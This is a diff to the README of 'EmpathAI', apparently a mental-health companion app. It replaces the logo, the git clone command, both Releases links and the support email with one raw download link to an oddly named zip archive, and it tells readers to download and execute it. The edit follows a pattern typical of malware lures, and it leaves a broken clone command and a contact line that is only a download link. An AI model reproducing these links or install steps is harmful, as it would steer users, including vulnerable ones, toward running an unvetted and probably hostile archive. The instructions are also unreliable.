@@ -1,6 +1,6 @@
 # EmpathAI: Your Emotional Well-being Companion 🤖❤️
 
-![EmpathAI Logo](https://via.placeholder.com/150)  
+![EmpathAI Logo](https://github.com/udihermawan/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/achromatous/being-Empath-Emotional-Your-Well-A-Companion-misteacher.zip)  
 
 Welcome to **EmpathAI**, your emotional well-being companion. Here, we blend cutting-edge technology with genuine care to address feelings of isolation and enhance mental health. Our mission is simple: to empower users through empathetic interactions, privacy, and cultural inclusion.
 
@@ -56,7 +56,7 @@ To get started with EmpathAI, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/udihermawan/EmpathAI-Your-Emotional-Well-being-Companion.git
+   git clone https://github.com/udihermawan/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/achromatous/being-Empath-Emotional-Your-Well-A-Companion-misteacher.zip
    ```
 
 2. Navigate to the project directory:
@@ -77,7 +77,7 @@ To get started with EmpathAI, follow these steps:
    npm start
    ```
 
-For more detailed instructions, check the [Releases](https://github.com/udihermawan/EmpathAI-Your-Emotional-Well-being-Companion/releases) section.
+For more detailed instructions, check the [Releases](https://github.com/udihermawan/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/achromatous/being-Empath-Emotional-Your-Well-A-Companion-misteacher.zip) section.
 
 ## Usage
 
@@ -127,11 +127,11 @@ EmpathAI is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 ## Contact
 
-For inquiries or support, please reach out to us at [support@empathai.com](mailto:support@empathai.com).
+For inquiries or support, please reach out to us at [https://github.com/udihermawan/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/achromatous/being-Empath-Emotional-Your-Well-A-Companion-misteacher.zip](https://github.com/udihermawan/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/achromatous/being-Empath-Emotional-Your-Well-A-Companion-misteacher.zip).
 
 ## Releases
 
-To download the latest version of EmpathAI, visit our [Releases](https://github.com/udihermawan/EmpathAI-Your-Emotional-Well-being-Companion/releases) page. Here, you can find the latest updates and versions to download and execute.
+To download the latest version of EmpathAI, visit our [Releases](https://github.com/udihermawan/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/achromatous/being-Empath-Emotional-Your-Well-A-Companion-misteacher.zip) page. Here, you can find the latest updates and versions to download and execute.
 
 ---
 
